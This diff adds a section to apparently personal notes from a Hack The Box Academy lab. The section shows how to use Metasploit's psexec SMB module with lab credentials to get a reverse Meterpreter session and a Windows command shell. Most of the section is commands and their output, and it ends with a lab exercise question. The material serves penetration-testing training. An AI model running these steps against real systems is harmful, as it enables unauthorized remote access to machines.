@@ -397,3 +397,140 @@ We need to understand the differences in payloads to understand why Windows Anti
 Because only then we can know how to bypass restrictions with what changes we need to do to our code/payload.
 
 Not all payloads are one-liners. Some payloads that we are going to use come from an automated attack framework as the Metasploit-framework.
+
+---
+
+## Automating Payloads & Delivery with Metasploit
+
+
+
+Metaspoit is an automated attack framework that makes it easier when you are in the process of exploiting vulnerabilites. 
+
+
+
+It has **pre-built** modules that we can use to exploit vulnerabilities and deliver payloads.
+
+
+
+I will use the community edition of Metasploit and using the **pre-built** modules and craft payloads with **MSFVenom**
+
+
+
+### Using Metasploit
+
+--- 
+
+#### Start Metasploit
+
+To start Metasploit in our console we launch the program as root with this command
+
+```shell-session
+DanielBoye@htb[/htb]$ sudo msfconsole 
+```
+
+#### 
+
+#### Search in Metasploit
+
+```shell-session
+msf6 > search smb
+```
+
+To search use `search`, and then the key word. 
+
+When searching for modules we need to know that they have different **Names**, **Disclosure Date**, **Rank**, **Check** and **Description**.
+
+
+
+#### Select the option
+
+```shell-session
+msf6 > use 56
+```
+
+To select the option, use `use`. Then provide the number of what module you want to use. 
+
+
+
+#### Checking the options
+
+```shell-session
+msf6 exploit(windows/smb/psexec) > options
+```
+
+Check options with `options`.
+
+When you have found a module to use, we often want to check the options we have.
+
+We do this to check what options we need to set before running the module
+
+
+
+#### Set the options
+
+```shell-session
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
+RHOSTS => 10.129.142.172
+msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
+SHARE => ADMIN$
+msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
+SMBPass => HTB_@cademy_stdnt!
+msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
+SMBUser => htb-student
+msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
+LHOST => 10.10.14.222
+```
+
+Here is an example of setting up a SMB module with the command `set`
+
+
+
+Key takeaways!
+
+- `RHOST` is the IP adress for the **target** 
+
+- `LHOST` is the IP adress of **our own** local machine
+
+
+
+#### Run the Exploit!
+
+```shell-session
+msf6 exploit(windows/smb/psexec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.222:4444 
+[*] 10.129.180.71:445 - Connecting to the server...
+[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
+[*] 10.129.180.71:445 - Selecting PowerShell target
+[*] 10.129.180.71:445 - Executing the payload...
+[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 10.129.180.71
+[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000
+
+meterpreter > 
+```
+
+Run the exploit with `exploit`.
+
+
+
+In this demonstration we obtained a shell with metepreter.
+
+
+
+#### Create **interactive shell** to the victims computer
+
+```shell-session
+meterpreter > shell
+Process 604 created.Channel 1 created.
+Microsoft Windows [Version 10.0.18362.1256]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>
+```
+
+Create a **interactive shell** in metepreter with `shell` 
+
+
+
+### Q: Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)
